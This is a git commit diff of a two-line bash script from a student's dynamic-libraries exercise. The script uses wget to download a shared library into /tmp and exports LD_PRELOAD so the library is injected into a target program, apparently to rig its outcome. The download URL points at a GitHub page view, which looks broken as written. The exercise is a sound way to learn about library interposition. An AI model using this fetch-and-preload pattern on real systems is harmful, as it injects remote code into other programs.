60c317c9f95bd2d9805bf9a873d65944290e269c
Aminuv <mohamed.elmarbouh07@gmail.com>
2023-06-19 16:26:12 -0700

    tasks 101

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget -P /tmp https://github.com/aminuv/alx-low_level_programming/tree/master/0x18-dynamic_libraries/libshared.so
-export LD_PRELOAD=/tmp/hacked.so
+export LD_PRELOAD=/tmp/libshared.so
